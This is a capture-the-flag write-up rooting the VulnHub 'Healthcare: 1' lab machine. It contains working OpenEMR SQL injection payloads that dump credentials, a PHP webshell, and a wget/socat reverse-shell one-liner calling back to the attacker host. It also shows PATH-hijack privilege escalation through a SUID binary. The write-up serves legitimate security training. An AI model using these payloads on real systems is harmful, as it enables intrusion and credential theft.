# Healthcare: 1

## Introduction

Welcome to my another writeup! In this VulnHub [Healthcare: 1](https://www.vulnhub.com/entry/healthcare-1,522/) box, you'll learn: Content discovery via `gobuster`, exploiting OpenEMR 4.1.0 SQL injection with error-based SQL injection, cracking password hashes, privilege escalation via SUID binary and `PATH` environment variable injection, and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: apache to medical](#privilege-escalation)**
4. **[Privilege Escalation: medical to root](#medical-to-root)**
5. **[Conclusion](#conclusion)**

## Background

Level: Intermediate

Description:This machine was developed to train the student to think according to the OSCP methodology. Pay attention to each step, because if you lose something you will not reach the goal: to become root in the system.

It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and root.txt.

## Service Enumeration

**Host discovery:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:08:26(HKT)]
└> sudo netdiscover -r 10.69.96.0/24
[...]
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                          
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.69.96.1      00:50:56:c0:00:08      1      60  VMware, Inc.                                           
 10.69.96.2      00:50:56:ef:bb:e8      1      60  VMware, Inc.                                           
 10.69.96.76     00:0c:29:bc:78:33      1      60  VMware, Inc.                                           
 10.69.96.200    00:50:56:f7:3f:20      1      60  VMware, Inc.                                           
```

- Target machine IP address: `10.96.69.76`
- Attacker machine IP address: `10.96.69.100`

**Create 2 environment variables for future use:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:08:52(HKT)]
└> export RHOSTS=10.69.96.76
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:08:55(HKT)]
└> export LHOST=`ifconfig eth0 | grep -E 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]' | cut -d' ' -f10`
```

As usual, scan the machine for open ports via `rustscan` and `nmap`!

**Rustscan:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:09:02(HKT)]
└> mkdir scanning; rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN scanning/rustscan.txt
[...]
Open 10.69.96.76:80
Open 10.69.96.76:21
[...]
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack ProFTPD 1.3.3d
80/tcp open  http    syn-ack Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
|_http-title: Coming Soon 2
|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 8 disallowed entries 
| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
|_/all_our_e-mail_addresses /admin/ /
Service Info: OS: Unix
```

**`nmap` UDP port scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:09:08(HKT)]
└> sudo nmap -v -sU $RHOSTS -oN scanning/nmap-udp-top1000.txt
[...]
PORT     STATE         SERVICE
68/udp   open|filtered dhcpc
5353/udp open          zeroconf
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:26:17(HKT)]
└> nc -nv $RHOSTS 5353
(UNKNOWN) [10.69.96.76] 5353 (?) : Connection refused
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:26:22(HKT)]
└> nc -nv $RHOSTS 68
(UNKNOWN) [10.69.96.76] 68 (?) : Connection refused
```

According to `rustscan` and `nmap` result, the target machine has 2 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|21/TCP            | ProFTPD 1.3.3d                |
|80/TCP            | Apache httpd 2.2.17           |

### FTP on TCP port 21

**Try anonymous (Guest) login:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:09:51(HKT)]
└> ftp $RHOSTS
Connected to 10.69.96.76.
220 ProFTPD 1.3.3d Server (ProFTPD Default Installation) [10.69.96.76]
Name (10.69.96.76:siunam): anonymous
331 Password required for anonymous
Password: 
530 Login incorrect.
ftp: Login failed
```

Nope. We need credentials to login.

### HTTP on TCP port 80

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Healthcare:1/images/Pasted%20image%2020230821171220.png)

In here, we can see that it's just a HTML template.

**`/robots.txt`:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:12:34(HKT)]
└> curl http://$RHOSTS/robots.txt
# $Id: robots.txt 410967 2009-08-06 19:44:54Z oden $
# $HeadURL: svn+ssh://svn.mandriva.com/svn/packages/cooker/apache-conf/current/SOURCES/robots.txt $
# exclude help system from robots
User-agent: *
Disallow: /manual/
Disallow: /manual-2.2/
Disallow: /addon-modules/
Disallow: /doc/
Disallow: /images/
# the next line is a spam bot trap, for grepping the logs. you should _really_ change this to something else...
Disallow: /all_our_e-mail_addresses
# same idea here...
Disallow: /admin/
# but allow htdig to index our doc-tree
#User-agent: htdig
#Disallow:
# disallow stress test
user-agent: stress-agent
Disallow: /
```

In `/robots.txt`, we can see there're a few endpoints.

**After some trial and error, only `/addon-modules/` exists:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:14:10(HKT)]
└> curl http://$RHOSTS/addon-modules/
This directory can only be viewed from localhost.
```

Hmm... That directory can only be viewed from `localhost`?

**Nikto vulnerability scan:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:16:06(HKT)]
└> nikto -h $RHOSTS
[...]
+ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
[...]
```

According to Nikto's scan result, the `/cgi-bin/test.cgi` seems like vulnerable to Shellshock vulnerability.

> Shellshock is a vulnerability in Bash shell, which allows attackers to achieve RCE (Remote Code Execution). 

**`/cgi-bin/test.cgi`:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:17:42(HKT)]
└> curl -s http://$RHOSTS/cgi-bin/test.cgi | html2text
Date: Mon Aug 21 10:17:44 2023
===============================================================================
****** It worked! ******
This script runs under: CGI/1.1
===============================================================================
ENV:
SCRIPT_NAME = /cgi-bin/test.cgi
SERVER_NAME = (Hidden for security purposes)
SERVER_ADMIN = (Hidden for security purposes)
REQUEST_METHOD = GET
HTTP_ACCEPT = */*
SCRIPT_FILENAME = (Hidden for security purposes)
SERVER_SOFTWARE = (Hidden for security purposes)
QUERY_STRING =
REMOTE_PORT = 48240
HTTP_USER_AGENT = curl/7.88.1
SERVER_SIGNATURE = Apache-AdvancedExtranetServer (Complete info hidden)
SERVER_PORT = (Hidden for security purposes)
REMOTE_ADDR = 10.69.96.100
SERVER_PROTOCOL = HTTP/1.1
PATH = (Hidden for security purposes)
REQUEST_URI = /cgi-bin/test.cgi
GATEWAY_INTERFACE = CGI/1.1
SERVER_ADDR = (Hidden for security purposes)
DOCUMENT_ROOT = (Hidden for security purposes)
HTTP_HOST = 10.69.96.76
MOD_PERL = (Hidden for security purposes)
UNIQUE_ID = ZOOcOH8AAAEAAAjc8GQAAAAE
```

As you can see, our request header `User-Agent` is reflected.

**We can try to send the following Shellshock payload:** (From [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi#curl-reflected-blind-and-out-of-band))
```bash
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|17:21:18(HKT)]
└> curl -H 'User-Agent: () { :; }; echo "VULNERABLE TO SHELLSHOCK"' http://$RHOSTS/cgi-bin/test.cgi
[...]
HTTP_USER_AGENT = () { :; }; echo "VULNERABLE TO SHELLSHOCK" <br>
[...]
```

But it failed?? No clue about that.

**Content discovery via `gobuster` to find hidden directories and files:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:09:18(HKT)]
└> gobuster dir -u http://$RHOSTS/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 40 
[...]
/images               (Status: 301) [Size: 338] [--> http://10.69.96.76/images/]
/js                   (Status: 301) [Size: 334] [--> http://10.69.96.76/js/]
/index                (Status: 200) [Size: 5031]
/fonts                (Status: 301) [Size: 337] [--> http://10.69.96.76/fonts/]
/phpMyAdmin           (Status: 403) [Size: 59]
/css                  (Status: 301) [Size: 335] [--> http://10.69.96.76/css/]
/vendor               (Status: 301) [Size: 338] [--> http://10.69.96.76/vendor/]
/robots               (Status: 200) [Size: 620]
/addon-modules        (Status: 403) [Size: 49]
/favicon              (Status: 200) [Size: 1406]
/server-status        (Status: 403) [Size: 997]
/gitweb               (Status: 301) [Size: 338] [--> http://10.69.96.76/gitweb/]
Progress: 23234 / 62285 (37.30%)[ERROR] parse "http://10.69.96.76/error\x1f_log": net/url: invalid control character in URL
/server-info          (Status: 403) [Size: 997]
/index                (Status: 200) [Size: 5031]
/perl-status          (Status: 403) [Size: 55]
[...]
```

Hmm... What's that `/gitweb/` directory?

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:10:12(HKT)]
└> httpx http://$RHOSTS/gitweb/
HTTP/1.1 403 Forbidden
[...]
```

Weird, it just response HTTP status code "403 Forbidden", maybe it has index listing disabled?

After I enumerated every I could, I found nothing.

**I then decided to change my wordlist in the content discovery process, and I found one more endpoint:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:13:39(HKT)]
└> gobuster dir -u http://$RHOSTS/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 40 
[...]
/css                  (Status: 301) [Size: 335] [--> http://10.69.96.76/css/]
/js                   (Status: 301) [Size: 334] [--> http://10.69.96.76/js/]
/vendor               (Status: 301) [Size: 338] [--> http://10.69.96.76/vendor/]
/favicon              (Status: 200) [Size: 1406]
/robots               (Status: 200) [Size: 620]
/index                (Status: 200) [Size: 5031]
/images               (Status: 301) [Size: 338] [--> http://10.69.96.76/images/]
/fonts                (Status: 301) [Size: 337] [--> http://10.69.96.76/fonts/]
/gitweb               (Status: 301) [Size: 338] [--> http://10.69.96.76/gitweb/]
/phpMyAdmin           (Status: 403) [Size: 59]
/server-status        (Status: 403) [Size: 997]
/openemr              (Status: 301) [Size: 339] [--> http://10.69.96.76/openemr/]
Progress: 1267342 / 1273834 (99.49%)
```

- Found new endpoint: `/openemr/`

**When we go to `/openemr/`, it redirects us to `/openemr/interface/login/login_frame.php?site=default`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Healthcare:1/images/Pasted%20image%2020230821181931.png)

Right off the bat, we see "**OpenEMR v4.1.0**".

> OpenEMR is the most popular open source electronic health records and medical practice management solution. (From [https://www.open-emr.org/](https://www.open-emr.org/))

## Initial Foothold

**Armed with above information, let's search for public exploits for this version of OpenEMR via `searchsploit`:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:20:09(HKT)]
└> searchsploit OpenEMR 4.1
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenEMR 4.1 - '/contrib/acog/print_form.php?formname' Traversal Local File Inclusion                                     | php/webapps/36650.txt
OpenEMR 4.1 - '/Interface/fax/fax_dispatch.php?File' 'exec()' Call Arbitrary Shell Command Execution                     | php/webapps/36651.txt
OpenEMR 4.1 - '/Interface/patient_file/encounter/load_form.php?formname' Traversal Local File Inclusion                  | php/webapps/36649.txt
OpenEMR 4.1 - '/Interface/patient_file/encounter/trend_form.php?formname' Traversal Local File Inclusion                 | php/webapps/36648.txt
OpenEMR 4.1 - 'note' HTML Injection                                                                                      | php/webapps/38654.txt
OpenEMR 4.1.0 - 'u' SQL Injection                                                                                        | php/webapps/49742.py
OpenEMR 4.1.1 - 'ofc_upload_image.php' Arbitrary File Upload                                                             | php/webapps/24492.php
OpenEMR 4.1.1 Patch 14 - Multiple Vulnerabilities                                                                        | php/webapps/28329.txt
OpenEMR 4.1.1 Patch 14 - SQL Injection / Privilege Escalation / Remote Code Execution (Metasploit)                       | php/remote/28408.rb
OpenEMR 4.1.2(7) - Multiple SQL Injections                                                                               | php/webapps/35518.txt
Openemr-4.1.0 - SQL Injection                                                                                            | php/webapps/17998.txt
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Oh! OpenEMR version 4.1.0 is vulnerable to SQL injection?

**After some trial and error, only `49742.py` Python exploit script works:**
```
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:21:07(HKT)]
└> searchsploit -m 49742     
  Exploit: OpenEMR 4.1.0 - 'u' SQL Injection
      URL: https://www.exploit-db.com/exploits/49742
     Path: /usr/share/exploitdb/exploits/php/webapps/49742.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/siunam/ctf/VulnHub/Healthcare:1/49742.py
```

**Change the IP address of the URL:**
```python
# edit url to point to your openemr instance
url = "http://10.69.96.76/openemr/interface/login/validateUser.php?u="
```

**Run the exploit to extract username and password hash:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:26:42(HKT)]
└> python3 49742.py

   ____                   ________  _______     __ __   ___ ____
  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \
 / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ /
\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/
    /_/
    ____  ___           __   _____ ____    __    _
   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)
  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /
 / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /
/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike

[+] Finding number of users...
[+] Found number of users: 2
[+] Extracting username and password hash...
admin:[...]
```

However, I think the SQL injection vulnerability can be exploited in a different way. Instead of exploiting **time-based SQL injection**, we can also **exploit error-based SQL injection**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Healthcare:1/images/Pasted%20image%2020230821182446.png)

The error indicates that the SQL query has syntax error, which means it's an error-based SQL injeciton.

Let's enumerate the database!

**Find the MySQL's version number:** (All payloads in below are from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based))
```sql
' and updatexml(null,concat(0x0a,version()),null)-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Healthcare:1/images/Pasted%20image%2020230821183203.png)

- MySQL version: **5.1.55**

**Exfiltrate table `users`'s column `username` and `password` data (From the original Python exploit script):**
```sql
' and updatexml(null,concat(0x0a,substr((SELECT concat(username,':',password) FROM users LIMIT 0,1), 1,31)),null)-- -
' and updatexml(null,concat(0x0a,substr((SELECT concat(username,':',password) FROM users LIMIT 0,1), 32,31)),null)-- -

' and updatexml(null,concat(0x0a,substr((SELECT concat(username,':',password) FROM users LIMIT 1,1), 1,31)),null)-- -
' and updatexml(null,concat(0x0a,substr((SELECT concat(username,':',password) FROM users LIMIT 1,1), 32,31)),null)-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Healthcare:1/images/Pasted%20image%2020230821184131.png)

**Exfiltrated:**
```
admin:{Redacted}
medical:{Redacted}
```

**Nice! Let's crack them all via `john`!**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:44:00(HKT)]
└> john --wordlist=/usr/share/wordlists/rockyou.txt password_hashes.txt 
[...]
{Redacted}          (medical)     
{Redacted}           (admin)     
[...]
```

But before we login as those users, I wanna try if we can write/read arbitrary files via SQL injection:

**Write file:**
```sql
' and updatexml(null,concat(0x0a,(SELECT "test" INTO OUTFILE "/var/www/html/test.txt")),null)-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Healthcare:1/images/Pasted%20image%2020230821185014.png)

**Read file:**
```sql
' and updatexml(null,concat(0x0a,(SELECT LOAD_FILE("/etc/passwd"))),null)-- -
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Healthcare:1/images/Pasted%20image%2020230821185146.png)

Nope. We can't.

**Well then, let's try to login as user `admin` on OpenEMR:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Healthcare:1/images/Pasted%20image%2020230821185258.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/VulnHub/Healthcare:1/images/Pasted%20image%2020230821185307.png)

We're in!

But after some digging, I found nothing special.

Let's take a step back.

**Since the FTP service is opened, we can try to login as those users:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:53:47(HKT)]
└> ftp $RHOSTS
[...]
Name (10.69.96.76:siunam): medical
331 Password required for medical
Password: 
230 User medical logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||18256|)
150 Opening ASCII mode data connection for file list
drwxr--r--   2 medical  medical      4096 Nov  5  2011 Desktop
drwx------   2 medical  medical      4096 Nov  5  2011 Documents
drwx------   2 medical  medical      4096 Oct 27  2011 Downloads
drwx------   2 medical  medical      4096 Jan 19  2010 Movies
drwx------   2 medical  medical      4096 Jan 19  2010 Music
drwx------   2 medical  medical      4096 Oct 27  2011 Pictures
drwxr-xr-x   2 medical  medical      4096 Jul 20  2011 Templates
drwxr-xr-x   2 medical  medical      4096 Jul 20  2011 Videos
drwx------   9 medical  medical      4096 Nov  5  2011 tmp
226 Transfer complete
```

After trying user `medical`'s credential, it worked! Nice!

After logged in, we can see user `medical`'s home directory.

**Then, when I fumbling around, I found a writable directory in `/var/www/html/openemr/`:**
```shell
ftp> cd /var/www/html
250 CWD command successful
ftp> ls -lah
229 Entering Extended Passive Mode (|||4601|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   9 root     root         4.0k Jul 29  2020 .
drwxr-xr-x  10 root     root         4.0k Oct 27  2011 ..
drwxr-xr-x   2 root     root         4.0k Oct 27  2011 addon-modules
drwxr-xr-x   2 root     root         4.0k Jan  7  2018 css
-rw-r--r--   1 root     root         1.4k Mar 19  2011 favicon.ico
drwxr-xr-x   5 root     root         4.0k Jan  7  2018 fonts
drwxr-xr-x   3 root     root         4.0k Jul 29  2020 images
-rwxr-xr-x   1 root     root         4.9k Jan  6  2018 index.html
drwxr-xr-x   2 root     root         4.0k Jan  7  2018 js
drwxr-xr-x  21 medical  medical      4.0k Aug 21 18:48 openemr
-rw-r--r--   1 root     root          620 Mar 19  2011 robots.txt
drwxr-xr-x   8 root     root         4.0k Jan  7  2018 vendor
```

That being said, we can write arbitrary files on the OpenEMR application!

**To gain initial foothold, let's upload a PHP webshell:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:56:05(HKT)]
└> echo '<?php system($_GET["cmd"]); ?>' > webshell.php
```

```shell
ftp> cd /var/www/html/openemr
[...]
ftp> put webshell.php 
[...]
226 Transfer complete
31 bytes sent in 00:00 (49.70 KiB/s)
```

**Test the uploaded webshell works or not:**
```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:57:03(HKT)]
└> curl http://10.69.96.76/openemr/webshell.php --get --data-urlencode "cmd=id" 
uid=479(apache) gid=416(apache) groups=416(apache)
```

It's working!

**Reverse shell time!**

- Setup a socat listener: (For fully interactive shell)

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:57:44(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/08/21 18:57:44 socat[122299] N opening character device "/dev/pts/1" for reading and writing
2023/08/21 18:57:44 socat[122299] N listening on AF=2 0.0.0.0:443
```

- Host the `socat` binary via Python's `http.server` module:

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:58:29(HKT)]
└> file /opt/static-binaries/binaries/linux/x86/socat-2.0.0-b8/socat 
/opt/static-binaries/binaries/linux/x86/socat-2.0.0-b8/socat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, with debug_info, not stripped
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:58:39(HKT)]
└> python3 -m http.server -d /opt/static-binaries/binaries/linux/x86/socat-2.0.0-b8/ 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Trigger the reverse shell: (Generated from [revshells.com](https://www.revshells.com/))

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:59:27(HKT)]
└> curl http://10.69.96.76/openemr/webshell.php --get --data-urlencode "cmd=wget http://10.69.96.100/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat TCP:10.69.96.100:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane"

```

- Profit:

```shell
┌[siunam♥Mercury]-(~/ctf/VulnHub/Healthcare:1)-[2023.08.21|18:57:44(HKT)]
└> socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
2023/08/21 18:57:44 socat[122299] N opening character device "/dev/pts/1" for reading and writing
2023/08/21 18:57:44 socat[122299] N listening on AF=2 0.0.0.0:443
                                                                 2023/08/21 18:59:28 socat[122299] N accepting connection from AF=2 10.69.96.76:41027 on AF=2 10.69.96.100:443
                                                                   2023/08/21 18:59:28 socat[122299] N starting data transfer loop with FDs [5,5] and [7,7]
                                                bash-4.1$ 
bash-4.1$ export TERM=xterm-256color
bash-4.1$ stty rows 22 columns 107
bash-4.1$ ^C
bash-4.1$ whoami; hostname; id; ip a
apache
localhost.localdomain
uid=479(apache) gid=416(apache) groups=416(apache)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:bc:78:33 brd ff:ff:ff:ff:ff:ff
    inet 10.69.96.76/24 brd 10.69.96.255 scope global eth0
    inet6 fe80::20c:29ff:febc:7833/64 scope link 
       valid_lft forever preferred_lft forever
```

**user.txt:**
```shell
bash-4.1$ cat /home/almirant/user.txt 
{Redacted}
```

## Privilege Escalation

### apache to medical

> Note: This step is not necessary.

**Since we cracked FTP user `medical` password, we can just use that password to authenticate, because I think the FTP is using user-based authentication:**
```shell
bash-4.1$ su medical 
Password: 
[medical@localhost openemr]$ whoami; hostname; id; ip a
medical
localhost.localdomain
uid=500(medical) gid=500(medical) groups=500(medical),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(users),490(polkituser),501(fuse)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:bc:78:33 brd ff:ff:ff:ff:ff:ff
    inet 10.69.96.76/24 brd 10.69.96.255 scope global eth0
    inet6 fe80::20c:29ff:febc:7833/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `medical`!

### medical to root

After gaining initial foothold on a target machine, we need to escalate our privilege. To do so, we need to enumerate the system.

**Find system users:**
```shell
[medical@localhost openemr]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[...]
medical:x:500:500:PCLinuxOS Medical:/home/medical:/bin/bash
[...]
almirant:x:501:502:Almirant:/home/almirant:/bin/bash
[medical@localhost openemr]$ ls -lah /home
total 20K
drwxr-xr-x  5 root     root     4.0K Jul 29  2020 ./
drwxr-xr-x 21 root     root     4.0K Aug 21 10:07 ../
drwxr-xr-x 27 almirant almirant 4.0K Jul 29  2020 almirant/
drwxr-xr-x 31 medical  medical  4.0K Nov  5  2011 medical/
drwxr-xr-x  3 root     root     4.0K Nov  4  2011 mysql/
```

- System user: `almirant`, `medical`

**Find kernel version:**
```shell
[medical@localhost openemr]$ uname -a; cat /etc/issue
Linux localhost.localdomain 2.6.38.8-pclos3.bfs #1 SMP PREEMPT Fri Jul 8 18:01:30 CDT 2011 i686 i686 i386 GNU/Linux
ZEN-mini release 2011 (PCLinuxOS) for i586
Kernel 2.6.38.8-pclos3.bfs on a Dual-processor i686 / \l
```

- Kernel version: **Linux 2.6.38.8**

Hmm... Very old Linux kernel version, maybe we can escalate our privilege via Kernel Exploits (KE)?

**SUID binaries:**
```shell
[medical@localhost openemr]$ find / -perm -4000 2>/dev/null
/usr/libexec/pt_chown
/usr/lib/ssh/ssh-keysign
/usr/lib/polkit-resolve-exe-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/chromium-browser/chrome-sandbox
/usr/lib/polkit-grant-helper-pam
/usr/lib/polkit-set-default-helper
/usr/sbin/fileshareset
/usr/sbin/traceroute6
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/bin/crontab
/usr/bin/at
/usr/bin/pumount
/usr/bin/batch
/usr/bin/expiry
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/wvdial
/usr/bin/pmount
/usr/bin/sperl5.10.1
/usr/bin/gpgsm
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpg
/usr/bin/healthcheck
/usr/bin/Xwrapper
/usr/bin/ping6
/usr/bin/chsh
/lib/dbus-1/dbus-daemon-launch-helper
/sbin/pam_timestamp_check
/bin/ping
/bin/fusermount
/bin/su
/bin/mount
/bin/umount
```

> SUID (setuid) binary is a special permission that runs as the file owner privilege.

Hmm... Lots of them are the default SUID binaries. However, there's one that's non-default.

**`/usr/bin/healthcheck`:**
```shell
[medical@localhost openemr]$ ls -lah /usr/bin/healthcheck
-rwsr-sr-x 1 root root 5.7K Jul 29  2020 /usr/bin/healthcheck*
[medical@localhost openemr]$ file /usr/bin/healthcheck
/usr/bin/healthcheck: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped
```

As you can see, the ELF 32-bit executable is owned by `root` and it has SUID sticky bit, which means when we run it, it'll be running as `root`.

**Listing all the strings:**
```shell
[medical@localhost openemr]$ strings /usr/bin/healthcheck
[...]
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
```

**In here, we can see that the program will run the following commands:**
```bash
clear
echo 'System Health Check'
echo ''
echo 'Scanning System'
sleep 2
ifconfig
fdisk -l
du -h
```

So, basically this program is displaying the network information about this machine and the file system's disk usage.

However, all the commands are using **relative path**.

**That being said, it's vulnerable to `PATH` variable injection!**

> `PATH` is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored. When the user run any command on the terminal, its request to the shell to search for executable files with the help of `PATH` Variable in response to commands executed by a user. The superuser also usually has `/sbin` and `/usr/sbin` entries for easily executing system administration commands. (From [https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/))

Since we have control over our environment variable, we can control which files we want to execute as `root`!

- Append a new directory (`/tmp`) to `PATH`:

```shell
[medical@localhost openemr]$ export PATH=/tmp:$PATH
[medical@localhost openemr]$ echo $PATH
/tmp:/sbin:/usr/sbin:/bin:/usr/bin:/usr/lib/qt4/bin
```

- Create fake `clear` Bash script:

```shell
[medical@localhost openemr]$ cat << EOF > /tmp/clear
> /bin/bash
> EOF
[medical@localhost openemr]$ chmod +x /tmp/clear
```

Now, when we run the vulnerable SUID binary, it'll find our `PATH` environment varible, and execute our fake `clear` Bash script.

- Run the vulnerable SUID binary:

```shell
[medical@localhost openemr]$ /usr/bin/healthcheck
[root@localhost openemr]# whoami; hostname; id; ip a
root
localhost.localdomain
uid=0(root) gid=0(root) groups=0(root),7(lp),19(floppy),22(cdrom),80(cdwriter),81(audio),82(video),83(dialout),100(users),490(polkituser),500(medical),501(fuse)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:0c:29:bc:78:33 brd ff:ff:ff:ff:ff:ff
    inet 10.69.96.76/24 brd 10.69.96.255 scope global eth0
    inet6 fe80::20c:29ff:febc:7833/64 scope link 
